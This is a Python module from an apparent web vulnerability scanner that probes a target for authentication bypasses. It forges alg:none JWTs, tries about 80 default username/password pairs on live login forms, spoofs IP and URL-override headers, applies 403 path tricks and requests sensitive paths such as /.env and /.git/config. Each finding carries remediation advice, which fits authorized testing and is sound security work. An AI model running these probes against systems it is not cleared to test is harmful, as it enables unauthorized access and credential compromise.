"""
Authentication & Authorization Bypass Scanner — Professional Grade
===================================================================
Coverage:
  • Forced browsing: 70+ sensitive paths (admin, actuator, API, debug, k8s)
  • IP-spoofing header bypass (X-Forwarded-For, X-Real-IP, X-Original-URL, …)
  • 403 path manipulation bypass (trailing slash, %2f, %09, ..;/, ;/, #, ?)
  • HTTP verb tampering on auth-blocked endpoints (PUT, DELETE, PATCH, HEAD)
  • Default credentials on login forms (30+ common pairs)
  • Token / API key in URL parameters (CWE-598)
  • Session token in URL (not cookie)
  • Password in URL (query string or path)
  • JWT algorithm confusion bypass (alg:none sent as Bearer token)
  • HTTP parameter pollution auth bypass (?admin=true, ?role=admin, ?debug=1)
  • Session fixation surface: login form sets session before auth
  • Unauthenticated API endpoint exposure (REST API without auth header)

CWE  : CWE-287, CWE-284, CWE-290, CWE-798, CWE-598, CWE-522
OWASP: A07:2021 – Identification and Authentication Failures
       A01:2021 – Broken Access Control
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability, Severity, VulnType, CVSSv3,
    AttackVector, AttackComplexity, PrivilegesRequired,
    UserInteraction, Scope, Impact,
)

# ---------------------------------------------------------------------------
# CVSS
# ---------------------------------------------------------------------------

_CVSS_CRITICAL = CVSSv3(AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE, Scope.UNCHANGED,
    Impact.HIGH, Impact.HIGH, Impact.HIGH)
_CVSS_HIGH = CVSSv3(AttackVector.NETWORK, AttackComplexity.LOW,
    PrivilegesRequired.NONE, UserInteraction.NONE, Scope.UNCHANGED,
    Impact.HIGH, Impact.LOW, Impact.NONE)
_CVSS_MEDIUM = CVSSv3(AttackVector.NETWORK, AttackComplexity.HIGH,
    PrivilegesRequired.NONE, UserInteraction.NONE, Scope.UNCHANGED,
    Impact.LOW, Impact.LOW, Impact.NONE)

# ---------------------------------------------------------------------------
# Shared metadata
# ---------------------------------------------------------------------------

_OWASP_AUTH   = "A07:2021 - Identification and Authentication Failures"
_OWASP_ACCESS = "A01:2021 - Broken Access Control"
_CWE_287  = "CWE-287"
_CWE_284  = "CWE-284"
_CWE_290  = "CWE-290"
_CWE_798  = "CWE-798"
_CWE_598  = "CWE-598"
_REFS_AUTH = [
    "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema",
    "https://cwe.mitre.org/data/definitions/287.html",
]

# ---------------------------------------------------------------------------
# Sensitive paths
# ---------------------------------------------------------------------------

SENSITIVE_PATHS: List[str] = [
    # Admin panels
    "/admin", "/admin/", "/admin/dashboard", "/admin/users",
    "/admin/config", "/admin/settings", "/admin/login",
    "/administrator", "/administrator/", "/administrator/index.php",
    "/wp-admin", "/wp-admin/", "/wp-login.php",
    "/dashboard", "/dashboard/",
    "/management", "/manage", "/manager",
    "/console", "/panel", "/control",
    "/controlpanel", "/cpanel",
    # API
    "/api/admin", "/api/admin/users", "/api/users",
    "/api/config", "/api/settings", "/api/debug",
    "/api/v1/admin", "/api/v2/admin",
    "/api/internal", "/api/private",
    "/v1/admin", "/v2/admin",
    "/rest/admin",
    # Spring Boot Actuator
    "/actuator", "/actuator/env", "/actuator/beans",
    "/actuator/configprops", "/actuator/mappings",
    "/actuator/httptrace", "/actuator/heapdump",
    "/actuator/loggers", "/actuator/metrics",
    "/actuator/scheduledtasks", "/actuator/flyway",
    # Monitoring
    "/metrics", "/health", "/health/details",
    "/status", "/server-status", "/server-info",
    "/info", "/ping",
    # Debug / dev
    "/debug", "/test", "/dev", "/development",
    "/phpinfo.php", "/info.php", "/test.php",
    "/config.php", "/configuration.php",
    "/.env", "/.env.local", "/.env.production",
    "/config.json", "/appsettings.json",
    "/web.config", "/application.properties",
    "/application.yml",
    # Kubernetes / cloud
    "/api/v1/secrets", "/api/v1/namespaces",
    "/.well-known/admin",
    # GraphQL
    "/graphql", "/graphiql", "/graphql/console",
    # Swagger / API docs
    "/swagger", "/swagger-ui", "/swagger-ui.html",
    "/api-docs", "/openapi.json", "/openapi.yaml",
    # Source code
    "/.git/config", "/.git/HEAD",
    "/.svn/entries", "/.hg/hgrc",
    "/backup.zip", "/backup.tar.gz", "/site.zip",
    # Internal
    "/internal", "/private",
    "/jenkins", "/jenkins/",
    "/sonar", "/sonarqube",
    "/kibana", "/grafana",
]

# ---------------------------------------------------------------------------
# Header-based bypass sets
# ---------------------------------------------------------------------------

_IP_BYPASS_HEADERS: List[Dict[str, str]] = [
    {"X-Forwarded-For":         "127.0.0.1"},
    {"X-Forwarded-For":         "localhost"},
    {"X-Real-IP":               "127.0.0.1"},
    {"X-Client-IP":             "127.0.0.1"},
    {"X-Remote-Addr":           "127.0.0.1"},
    {"X-Originating-IP":        "127.0.0.1"},
    {"Client-IP":               "127.0.0.1"},
    {"True-Client-IP":          "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host":        "localhost"},
    {"X-Host":                  "localhost"},
    {"Forwarded":               "for=127.0.0.1"},
    {"X-ProxyUser-Ip":          "127.0.0.1"},
]

_URL_OVERRIDE_HEADERS: List[Dict[str, str]] = [
    {"X-Original-URL":          "/admin"},
    {"X-Rewrite-URL":           "/admin"},
    {"X-Override-URL":          "/admin"},
    {"X-Original-URL":          "/actuator/env"},
    {"X-Rewrite-URL":           "/actuator/env"},
]

# ---------------------------------------------------------------------------
# 403 path bypass tricks
# ---------------------------------------------------------------------------

_PATH_BYPASS_TRICKS: List[str] = [
    "{path}/",
    "{path}//",
    "{path}/.",
    "{path}/..",
    "{path}/../{leaf}",
    "{path}%2f",
    "{path}%20",
    "{path}%09",
    "{path}..;/",
    "{path};/",
    "{path}#",
    "{path}?",
    "/{path}",
    "//{path}",
    "{path}%00",
    "{path}.json",
    "{path}.html",
    "{path};.js",
]

# ---------------------------------------------------------------------------
# HTTP verbs for tampering (excludes TRACE/OPTIONS per previous fix)
# ---------------------------------------------------------------------------

_BYPASS_VERBS = ["HEAD", "PUT", "DELETE", "PATCH"]

# ---------------------------------------------------------------------------
# Parameter pollution auth bypass
# ---------------------------------------------------------------------------

_POLLUTION_PARAMS: List[Tuple[str, str]] = [
    ("admin",  "true"),
    ("admin",  "1"),
    ("role",   "admin"),
    ("role",   "administrator"),
    ("debug",  "true"),
    ("debug",  "1"),
    ("isAdmin", "true"),
    ("is_admin", "true"),
    ("superuser", "true"),
    ("privilege", "admin"),
    ("auth",   "true"),
    ("access", "granted"),
]

# ---------------------------------------------------------------------------
# Default credentials
# ---------------------------------------------------------------------------

_DEFAULT_CREDS: List[Tuple[str, str]] = [
    # ── Common admin defaults ─────────────────────────────────────────────
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "admin123"),
    ("admin",          "123456"),
    ("admin",          "12345678"),
    ("admin",          "1234"),
    ("admin",          "12345"),
    ("admin",          ""),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
    ("admin",          "admin@123"),
    ("admin",          "Admin1234"),
    ("admin",          "P@ssw0rd"),
    ("admin",          "changeme"),
    ("admin",          "secret"),
    ("admin",          "pass"),
    ("admin",          "password1"),
    ("admin",          "admin1"),
    ("admin",          "root"),
    ("admin",          "welcome"),
    ("admin",          "abc123"),
    ("admin",          "trustno1"),
    ("admin",          "iloveyou"),
    # ── Administrator ─────────────────────────────────────────────────────
    ("administrator",  "administrator"),
    ("administrator",  "password"),
    ("administrator",  "admin"),
    ("administrator",  ""),
    # ── Root ──────────────────────────────────────────────────────────────
    ("root",           "root"),
    ("root",           "toor"),
    ("root",           ""),
    ("root",           "password"),
    ("root",           "root123"),
    ("root",           "alpine"),      # Alpine Linux
    ("root",           "root@123"),
    # ── Web app defaults ──────────────────────────────────────────────────
    ("user",           "user"),
    ("user",           "password"),
    ("user",           "user123"),
    ("test",           "test"),
    ("test",           "password"),
    ("test",           "test123"),
    ("guest",          "guest"),
    ("guest",          "password"),
    ("demo",           "demo"),
    ("demo",           "password"),
    ("support",        "support"),
    ("operator",       "operator"),
    ("superadmin",     "superadmin"),
    ("manager",        "manager"),
    ("service",        "service"),
    # ── Device / appliance defaults ───────────────────────────────────────
    ("pi",             "raspberry"),   # Raspberry Pi
    ("ubnt",           "ubnt"),        # Ubiquiti
    ("cisco",          "cisco"),       # Cisco
    ("admin",          "cisco"),
    ("admin",          "1234567890"),
    ("admin",          "admin1234"),
    ("admin",          "Admin@123"),
    ("admin",          "password123"),
    ("admin",          "pass@123"),
    ("admin",          "system"),
    # ── CMS defaults ──────────────────────────────────────────────────────
    ("admin",          "admin"),       # WordPress / Joomla / Drupal
    ("admin",          "joomla"),
    ("admin",          "drupal"),
    ("wordpress",      "wordpress"),
    ("wp",             "wp"),
    # ── Database / service accounts ───────────────────────────────────────
    ("sa",             "sa"),
    ("sa",             ""),
    ("sa",             "password"),
    ("postgres",       "postgres"),
    ("postgres",       ""),
    ("mysql",          "mysql"),
    ("oracle",         "oracle"),
    ("oracle",         "change_on_install"),
    ("sysdba",         "change_on_install"),
    # ── API / generic ────────────────────────────────────────────────────
    ("apikey",         "apikey"),
    ("api",            "api"),
    ("monitor",        "monitor"),
]

# ---------------------------------------------------------------------------
# Sensitive URL parameter names
# ---------------------------------------------------------------------------

_SENSITIVE_PARAM_RE = re.compile(
    r"(?i)\b(api[_\-]?key|apikey|access[_\-]?token|auth[_\-]?token|"
    r"secret|private[_\-]?key|token|jwt|bearer|password|passwd|pwd|"
    r"session[_\-]?id|sid)\b",
)

# Auth-indicating text patterns in responses
_AUTH_REQUIRED_RE = re.compile(
    r"(?i)(unauthorized|forbidden|login required|please log[_ ]?in|"
    r"sign in to|authentication required|access denied|not authenticated|"
    r"401|403|you must be logged)",
)

# JWT format
_JWT_RE = re.compile(
    r"eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]*"
)

# Successful auth indicators
_AUTH_SUCCESS_RE = re.compile(
    r"(?i)(dashboard|logout|welcome|sign out|my account|profile|"
    r"home page|admin panel|settings|you are logged)",
)


# ===========================================================================
# Scanner
# ===========================================================================

class AuthBypassScanner(_ScannerBase):
    """
    Comprehensive Authentication & Authorization Bypass scanner.
    Runs once per target (is_target_level=True).
    """

    name = "Auth Bypass"
    is_target_level = True

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        vulns.extend(await self._test_forced_browsing(base))
        vulns.extend(await self._test_header_bypass(base))
        vulns.extend(await self._test_403_path_bypass(base))
        vulns.extend(await self._test_verb_tampering(base))
        vulns.extend(await self._test_parameter_pollution(url))
        vulns.extend(await self._check_default_credentials(url, response, forms))
        vulns.extend(self._check_sensitive_in_url(url))
        vulns.extend(await self._test_jwt_alg_none(url, response))

        return vulns

    # -----------------------------------------------------------------------
    # 1. Forced browsing — 70+ sensitive paths
    # -----------------------------------------------------------------------

    async def _test_forced_browsing(self, base: str) -> List[Vulnerability]:
        """
        Access sensitive paths without auth — only report when content
        actually looks like admin/debug/config data, not a generic page.
        """
        vulns: List[Vulnerability] = []

        # Patterns that confirm the response is genuinely sensitive content
        _SENSITIVE_CONTENT_RE = re.compile(
            r"(?i)("
            r"admin\s*(panel|dashboard|console|area|login)|"
            r"management\s*(console|interface|panel)|"
            r"phpinfo\(\)|php version|server api|"
            r"environment\s*variables|spring.*actuator|"
            r"heap\s*dump|thread\s*dump|loggers|"
            r"swagger\s*ui|openapi|api\s*documentation|"
            r"debug\s*(mode|console|info)|"
            r"datasource\s*url|database\s*(password|host|url)|"
            r"secret[_\-]?key\s*=|api[_\-]?key\s*=|"
            r"jenkins|grafana|kibana|elasticsearch|"
            r"\"beans\"\s*:\s*\[|\"mappings\"\s*:\s*\{|"    # Spring actuator
            r"\"configprops\"\s*:|\"env\"\s*:\s*\{"          # Spring env
            r")"
        )

        for path in SENSITIVE_PATHS:
            target_url = urljoin(base, path)
            resp = await self.client.get(target_url)
            if resp is None:
                continue

            if resp.status_code != 200:
                continue
            if _AUTH_REQUIRED_RE.search(resp.text):
                continue

            body_len = len(resp.text)
            if body_len < 50:
                continue

            # Must contain sensitive content indicators OR be a known
            # data-format response (JSON/XML) that's non-trivial in size
            is_json_api = "application/json" in resp.content_type.lower() and body_len > 100
            has_sensitive = bool(_SENSITIVE_CONTENT_RE.search(resp.text[:3000]))

            if not (has_sensitive or is_json_api):
                continue

            vulns.append(self._build_vuln(
                vuln_type=VulnType.BROKEN_AUTH,
                title=f"Sensitive Path Accessible Without Authentication: {path}",
                description=(
                    f"The path '{path}' returned HTTP 200 with sensitive-looking content "
                    f"without any authentication. This indicates missing access controls "
                    f"on administrative, debug, or API functionality."
                ),
                url=target_url,
                method="GET", payload=path,
                evidence=f"HTTP 200, {body_len} bytes — sensitive content detected",
                severity=Severity.HIGH, cvss=_CVSS_HIGH,
                remediation=(
                    "Implement authentication middleware on all sensitive routes. "
                    "Return 401/403 for unauthenticated access. "
                    "Use allowlist-based route protection."
                ),
                references=_REFS_AUTH,
                cwe_id=_CWE_287, owasp_category=_OWASP_ACCESS,
                confidence="Medium",
                response_snippet=self._snippet(resp.text),
            ))
        return vulns

    # -----------------------------------------------------------------------
    # 2. Header-based bypass
    # -----------------------------------------------------------------------

    async def _test_header_bypass(self, base: str) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        test_paths = ["/admin", "/actuator/env", "/api/admin", "/api/users"]

        for path in test_paths:
            normal_url  = urljoin(base, path)
            normal_resp = await self.client.get(normal_url)
            if not normal_resp or normal_resp.status_code not in (401, 403):
                continue

            # IP-spoofing headers
            for header_set in _IP_BYPASS_HEADERS:
                resp = await self.client.get(normal_url, headers=header_set)
                if resp and resp.status_code == 200 and not _AUTH_REQUIRED_RE.search(resp.text):
                    header_str = next(f"{k}: {v}" for k, v in header_set.items())
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"Auth Bypass via IP-Spoofing Header: {path}",
                        description=(
                            f"Header '{header_str}' bypassed 401/403 on '{path}' → HTTP 200. "
                            f"The server trusts client-supplied IP headers for access control, "
                            f"allowing any attacker to impersonate localhost."
                        ),
                        url=normal_url, method="GET", payload=header_str,
                        evidence=f"'{header_str}' → HTTP 200",
                        severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                        remediation=(
                            "Never trust X-Forwarded-For/X-Real-IP for security decisions. "
                            "If behind a proxy, only trust the proxy's IP address."
                        ),
                        references=[
                            "https://cwe.mitre.org/data/definitions/290.html",
                        ],
                        cwe_id=_CWE_290, owasp_category=_OWASP_AUTH,
                        confidence="High",
                    ))
                    break

            # URL-override headers
            for header_set in _URL_OVERRIDE_HEADERS:
                resp = await self.client.get(base + "/", headers=header_set)
                if resp and resp.status_code == 200 and not _AUTH_REQUIRED_RE.search(resp.text):
                    header_str = next(f"{k}: {v}" for k, v in header_set.items())
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"Auth Bypass via URL-Override Header: {header_str}",
                        description=(
                            f"Sending '{header_str}' overrode the actual request path, "
                            f"bypassing ACL checks and returning HTTP 200 for protected content."
                        ),
                        url=base + "/", method="GET", payload=header_str,
                        evidence=f"'{header_str}' → HTTP 200 on /",
                        severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                        remediation=(
                            "Disable X-Original-URL / X-Rewrite-URL header processing in "
                            "reverse proxy/framework unless explicitly needed."
                        ),
                        references=["https://cwe.mitre.org/data/definitions/290.html"],
                        cwe_id=_CWE_290, owasp_category=_OWASP_AUTH,
                        confidence="High",
                    ))
                    break

        return vulns

    # -----------------------------------------------------------------------
    # 3. 403 path bypass
    # -----------------------------------------------------------------------

    async def _test_403_path_bypass(self, base: str) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        for path in ["/admin", "/admin/dashboard", "/api/admin", "/actuator/env"]:
            normal_url  = urljoin(base, path)
            normal_resp = await self.client.get(normal_url)
            if not normal_resp or normal_resp.status_code != 403:
                continue

            leaf = path.rsplit("/", 1)[-1] or path.lstrip("/")

            for trick in _PATH_BYPASS_TRICKS:
                trick_path = trick.format(path=path.lstrip("/"), leaf=leaf)
                trick_url  = urljoin(base, "/" + trick_path)
                resp = await self.client.get(trick_url)
                if resp and resp.status_code == 200 and not _AUTH_REQUIRED_RE.search(resp.text):
                    if len(resp.text) < 50:
                        continue
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"403 Bypass via Path Trick: {path} → /{trick_path}",
                        description=(
                            f"'{path}' returns 403, but '/{trick_path}' returns 200. "
                            f"Path normalization is inconsistent between the ACL check "
                            f"and the request router, enabling WAF/ACL bypass."
                        ),
                        url=trick_url, method="GET", payload=trick_path,
                        evidence=f"'{path}' → 403; '/{trick_path}' → 200",
                        severity=Severity.HIGH, cvss=_CVSS_HIGH,
                        remediation=(
                            "Apply path normalization before ACL checks. "
                            "Deny by default and allowlist permitted paths."
                        ),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema",
                            "https://cwe.mitre.org/data/definitions/284.html",
                        ],
                        cwe_id=_CWE_284, owasp_category=_OWASP_ACCESS,
                        confidence="High",
                    ))
                    break
        return vulns

    # -----------------------------------------------------------------------
    # 4. Verb tampering
    # -----------------------------------------------------------------------

    async def _test_verb_tampering(self, base: str) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        for path in ["/admin", "/api/admin/users", "/api/users"]:
            normal_url  = urljoin(base, path)
            normal_resp = await self.client.get(normal_url)
            if not normal_resp or normal_resp.status_code not in (401, 403):
                continue

            for verb in _BYPASS_VERBS:
                resp = await self.client.request(verb, normal_url)
                if resp and resp.status_code == 200:
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"HTTP Verb Tampering Bypasses ACL: {verb} {path}",
                        description=(
                            f"GET → {normal_resp.status_code}, but {verb} → 200 on '{path}'. "
                            f"Access control is only enforced on GET, allowing bypass via {verb}."
                        ),
                        url=normal_url, method=verb, payload=f"HTTP {verb}",
                        evidence=f"GET → {normal_resp.status_code}; {verb} → 200",
                        severity=Severity.HIGH, cvss=_CVSS_HIGH,
                        remediation=(
                            "Apply access control to ALL HTTP methods, not just GET/POST. "
                            "Disable unused methods at the server level."
                        ),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods",
                            "https://cwe.mitre.org/data/definitions/284.html",
                        ],
                        cwe_id=_CWE_284, owasp_category=_OWASP_ACCESS,
                        confidence="High",
                    ))
                    break
        return vulns

    # -----------------------------------------------------------------------
    # 5. Parameter pollution auth bypass
    # -----------------------------------------------------------------------

    async def _test_parameter_pollution(self, url: str) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        parsed  = urlparse(url)
        base    = f"{parsed.scheme}://{parsed.netloc}"

        for path in ["/admin", "/api/admin", "/dashboard"]:
            target = urljoin(base, path)
            normal = await self.client.get(target)
            if not normal or normal.status_code not in (401, 403):
                continue

            for param, value in _POLLUTION_PARAMS:
                polluted = f"{target}?{param}={value}"
                resp = await self.client.get(polluted)
                if resp and resp.status_code == 200 and not _AUTH_REQUIRED_RE.search(resp.text):
                    if len(resp.text) < 50:
                        continue
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"Auth Bypass via Parameter Pollution: ?{param}={value}",
                        description=(
                            f"Adding '?{param}={value}' to '{path}' bypassed "
                            f"the {normal.status_code} restriction, returning HTTP 200. "
                            f"The server trusts client-supplied privilege parameters."
                        ),
                        url=polluted, method="GET", payload=f"{param}={value}",
                        evidence=f"'{path}' → {normal.status_code}; '{path}?{param}={value}' → 200",
                        severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                        remediation=(
                            "Never derive privileges or roles from request parameters. "
                            "Determine authorization solely from the authenticated session server-side."
                        ),
                        references=[
                            "https://cwe.mitre.org/data/definitions/287.html",
                        ],
                        cwe_id=_CWE_287, owasp_category=_OWASP_AUTH,
                        confidence="High",
                    ))
                    break
        return vulns

    # -----------------------------------------------------------------------
    # 6. Default credentials
    # -----------------------------------------------------------------------

    async def _check_default_credentials(
        self, url: str, response: HTTPResponse, forms: List[Dict[str, Any]]
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        login_forms = [
            f for f in forms
            if (f.get("method") or "GET").upper() == "POST" and
               any(inp.get("type", "").lower() == "password" for inp in f.get("inputs", []))
        ]

        for form in login_forms[:2]:
            action = form.get("action") or url
            inputs = form.get("inputs", [])

            user_field = next(
                (i["name"] for i in inputs
                 if (i.get("type", "").lower() in ("text", "email") or
                     any(k in i.get("name", "").lower() for k in ("user", "email", "login", "name")))),
                None,
            )
            pass_field = next(
                (i["name"] for i in inputs if i.get("type", "").lower() == "password"),
                None,
            )

            if not user_field or not pass_field:
                continue

            # Capture a failed-login baseline to avoid FP
            base_data = {
                inp["name"]: inp.get("value", "")
                for inp in inputs
                if inp.get("type") not in ("submit", "button")
            }
            base_data[user_field] = "zzz_invalid_user_zzz"
            base_data[pass_field] = "zzz_invalid_pass_zzz"
            failed_resp = await self.client.post(action, data=base_data)
            failed_indicators_baseline: set = set()
            if failed_resp:
                body_lower = failed_resp.text.lower()
                for kw in ("invalid", "incorrect", "failed", "wrong", "error", "unauthorized"):
                    if kw in body_lower:
                        failed_indicators_baseline.add(kw)

            for username, password in _DEFAULT_CREDS:
                form_data = dict(base_data)
                form_data[user_field] = username
                form_data[pass_field] = password

                resp = await self.client.post(action, data=form_data)
                if not resp:
                    continue

                body_lower = resp.text.lower()
                failed = any(
                    kw in body_lower
                    for kw in ("invalid", "incorrect", "failed", "wrong", "error",
                               "unauthorized", "bad credentials")
                    if kw not in failed_indicators_baseline
                )

                # Fix 2.6: multi-signal success detection — avoid FP on 302 login-fail redirect
                if not failed and await self._is_login_successful(action, resp):
                    vulns.append(self._build_vuln(
                        vuln_type=VulnType.BROKEN_AUTH,
                        title=f"Default Credentials Accepted: {username} / {password or '(empty)'}",
                        description=(
                            f"The login form at '{action}' accepted credentials "
                            f"'{username}'/'{password or '(empty)'}'. "
                            f"Default credentials allow immediate unauthorized access."
                        ),
                        url=action, method="POST",
                        parameter=f"{user_field}, {pass_field}",
                        payload=f"{username}:{password or '(empty)'}",
                        evidence=f"HTTP {resp.status_code} — no failure indicator found",
                        severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                        remediation=(
                            "Change all default credentials immediately. "
                            "Enforce strong password policies and account lockout. "
                            "Use multi-factor authentication."
                        ),
                        references=[
                            "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication",
                            "https://cwe.mitre.org/data/definitions/798.html",
                        ],
                        cwe_id=_CWE_798, owasp_category=_OWASP_AUTH,
                        confidence="Medium",
                    ))
                    break
        return vulns

    async def _is_login_successful(self, action: str, resp: HTTPResponse) -> bool:
        """
        Fix 2.6: Multi-signal success detection for login forms.
        Avoids FP where server always returns 302 even on failed login.
        """
        if resp.status_code == 302:
            location = (resp.header("location") or "").lower()
            # Redirect to login page → failure
            if any(kw in location for kw in ("login", "signin", "sign-in", "error", "fail", "auth")):
                return False
            # Redirect to dashboard/home → likely success
            if any(kw in location for kw in ("dashboard", "home", "account", "profile", "welcome", "admin")):
                return True
            # Ambiguous redirect — follow it and check the destination
            location_raw = resp.header("location") or ""
            if location_raw:
                if not location_raw.startswith("http"):
                    # Relative path — reconstruct absolute URL
                    from urllib.parse import urlparse
                    p = urlparse(action)
                    location_raw = f"{p.scheme}://{p.netloc}{location_raw}"
                follow_resp = await self.client.get(location_raw)
                if follow_resp and follow_resp.is_text:
                    follow_lower = follow_resp.text.lower()
                    # Check if the destination shows a logged-in state
                    if _AUTH_SUCCESS_RE.search(follow_lower):
                        return True
                    # Check if it still asks to log in
                    if _AUTH_REQUIRED_RE.search(follow_lower):
                        return False
            return False  # default: treat ambiguous 302 as failure

        if resp.status_code == 200:
            body_lower = resp.text.lower()
            has_success = bool(_AUTH_SUCCESS_RE.search(body_lower))
            has_failure = any(kw in body_lower for kw in
                              ("invalid", "incorrect", "failed", "wrong", "error", "bad credentials"))
            return has_success and not has_failure

        return False

    # -----------------------------------------------------------------------
    # 7. Sensitive data in URL
    # -----------------------------------------------------------------------

    def _check_sensitive_in_url(self, url: str) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        parsed = urlparse(url)
        params = parsed.query

        m = _SENSITIVE_PARAM_RE.search(params)
        if m:
            vulns.append(self._build_vuln(
                vuln_type=VulnType.BROKEN_AUTH,
                title=f"Sensitive Token/Credential in URL Parameter: {m.group(0)}",
                description=(
                    f"The URL contains a sensitive parameter '{m.group(0)}' in the query string. "
                    f"URL parameters appear in server logs, browser history, Referer headers, "
                    f"and are visible to proxies — leaking credentials to unintended parties."
                ),
                url=url, parameter=m.group(0),
                evidence=f"Query string: {params[:100]}",
                severity=Severity.HIGH, cvss=_CVSS_HIGH,
                remediation=(
                    "Transmit credentials and tokens in HTTP headers (Authorization, Cookie), "
                    "never in URL query parameters."
                ),
                references=[
                    "https://cwe.mitre.org/data/definitions/598.html",
                ],
                cwe_id=_CWE_598, owasp_category=_OWASP_AUTH,
                confidence="High",
            ))
        return vulns

    # -----------------------------------------------------------------------
    # 8. JWT algorithm none bypass
    # -----------------------------------------------------------------------

    async def _test_jwt_alg_none(
        self, url: str, response: HTTPResponse
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []

        # Look for a JWT in the response to forge
        body = response.text
        m = _JWT_RE.search(body)
        auth_header = response.header("authorization") or ""
        token_src = None

        if auth_header.startswith("Bearer "):
            token_src = auth_header[7:].strip()
        elif m:
            token_src = m.group(0)

        if not token_src:
            return vulns

        # Forge none-algorithm token
        try:
            import base64, json as _json
            parts = token_src.split(".")
            if len(parts) != 3:
                return vulns

            # Decode payload
            payload_padded = parts[1] + "=" * (-len(parts[1]) % 4)
            payload_bytes  = base64.urlsafe_b64decode(payload_padded)

            # New header with alg=none
            new_header = base64.urlsafe_b64encode(
                _json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()

            forged = f"{new_header}.{parts[1]}."

            # Test with forged token
            resp = await self.client.get(
                url,
                headers={"Authorization": f"Bearer {forged}"}
            )
            if resp and resp.status_code == 200 and not _AUTH_REQUIRED_RE.search(resp.text):
                vulns.append(self._build_vuln(
                    vuln_type=VulnType.JWT,
                    title="JWT Algorithm Confusion: 'none' Attack Accepted",
                    description=(
                        "The server accepted a JWT token with the algorithm changed to 'none' "
                        "and an empty signature. This means the server does not enforce "
                        "algorithm validation, allowing complete authentication bypass by "
                        "forging arbitrary JWT payloads."
                    ),
                    url=url,
                    payload=f"alg:none forged JWT ({forged[:40]}...)",
                    evidence=f"Forged none-alg JWT accepted: HTTP {resp.status_code}",
                    severity=Severity.CRITICAL, cvss=_CVSS_CRITICAL,
                    remediation=(
                        "Hardcode the expected algorithm server-side. "
                        "Reject tokens where alg differs from the expected value. "
                        "Never accept alg=none."
                    ),
                    references=[
                        "https://portswigger.net/web-security/jwt",
                        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                        "https://cwe.mitre.org/data/definitions/347.html",
                    ],
                    cwe_id="CWE-347", owasp_category=_OWASP_AUTH,
                    confidence="High",
                ))
        except Exception:
            pass

        return vulns
